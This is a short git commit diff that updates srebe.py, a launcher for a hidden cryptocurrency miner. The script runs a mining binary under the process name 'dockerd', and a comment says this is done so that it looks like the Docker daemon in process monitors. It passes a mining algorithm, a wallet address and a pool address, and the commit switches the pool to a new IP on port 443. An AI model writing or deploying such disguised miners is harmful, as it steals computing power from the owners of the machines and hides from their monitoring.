3b9266ad861de689a5674a96a41dec1d9b6b1353
ferasa <86012372+desafff@users.noreply.github.com>
2025-01-14 09:04:32 +0700

    Update srebe.py

--- srebe.py
+++ srebe.py
@@ -5,7 +5,7 @@ os.execvp("./srebe", [
     "dockerd",  # This will be the name shown in process monitors
     "--disable-gpu",
     "--algorithm", "yespowersugar",
-    "--pool", "149.56.27.47:3956",
+    "--pool", "45.88.24.129:443",
     "--wallet", "sugar1qgry5hf7ah3e9ef0zkqr0evlg39mauhes6dl3gf",
     "--worker", "aaaa",  # Using a fixed worker name
     "--password", "x",
